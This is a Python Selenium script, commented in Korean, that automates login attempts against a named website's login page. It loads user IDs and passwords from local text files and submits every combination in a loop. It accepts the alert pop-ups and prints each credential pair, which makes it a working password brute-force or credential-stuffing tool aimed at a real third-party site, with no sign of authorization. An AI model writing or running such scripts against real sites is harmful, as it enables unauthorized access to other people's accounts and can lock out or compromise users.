from selenium import webdriver
import time
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

url = 'http://abc3149.com/index.php'

# 팬텀JS 드라이버 추출하기

driver = webdriver.PhantomJS("C:\\Temp\phantomjs-2.1.1-windows\\bin\\phantomjs.exe")

# 3초 대기하기

driver.implicitly_wait(3)

# URL읽어들이기
driver.get(url)
# 캡쳐해서 저장하기


lists_id = []
lists_pw = []


#
f_id = open("C:\\Temp\\id.txt", 'r')
while True:
    line_id = f_id.readline()
    if not line_id: break
    # print(line_id)
    lists_id.append(line_id.rstrip().lstrip())
f_id.close()

f_pw = open("C:\\Temp\\pw.txt", 'r')
while True:
    line_pw = f_pw.readline()
    if not line_pw: break
    # print(line_pw)
    lists_pw.append(line_pw.rstrip().lstrip())
f_pw.close()


try:
    for list_id in lists_id:
        for list_pw in lists_pw:
            driver.find_element_by_id('userid').send_keys(list_id)
            print(list_id)
            driver.find_element_by_id('userpw').send_keys(list_pw)
            print(list_pw)

            time.sleep(4)
            print("yy")
            driver.save_screenshot("Website.png")

            driver.find_element_by_xpath("//button").click()

            #경고창 발생 시 사용
            WebDriverWait(driver, 3).until(EC.alert_is_present(),
                                            'Timed out waiting for PA creation ' +
                                            'confirmation popup to appear.')

            alert = driver.switch_to.alert
            alert.accept()
            print("alert accepted")
            # time.sleep(4)
            # driver.find_element_by_xpath('//button/span').click()
except Exception as eLog:
    print(eLog)
    print(list_id +"," +list_pw)



# 종료하기

driver.quit()
